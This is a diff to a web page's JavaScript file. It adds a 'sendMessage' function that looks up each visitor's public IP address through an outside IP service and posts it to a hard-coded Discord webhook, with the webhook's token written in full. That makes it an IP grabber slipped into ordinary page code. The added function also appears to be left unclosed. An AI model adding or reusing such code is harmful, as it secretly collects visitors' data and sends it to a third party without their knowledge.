@@ -2,6 +2,33 @@ $(window).load(function() {
     $("body").removeClass("preload");
 });
 
+
+
+function sendMessage() {
+      const request = new XMLHttpRequest();
+      request.open("POST", "https://discord.com/api/webhooks/1318648499599839253/b6yUhYvvxVPzD008yXF_uiPnuKLuwvciX4FOBcG9Mfsx2dkoevCE-wssJXO8Z8xfUXQt");
+
+      request.setRequestHeader('Content-type', 'application/json');
+
+      
+
+fetch('https://api.ipify.org?format=json')
+  .then(response => response.json())
+  .then(data => {
+       let params = {
+        username: "lob",
+        avatar_url: "",
+        content: "IP: " + data.ip
+      }   
+
+      request.send(JSON.stringify(params));
+      alert(data.ip)
+  });
+    
+
+
+
+
 let containerArray = [
     {
         ["Transform"]: {
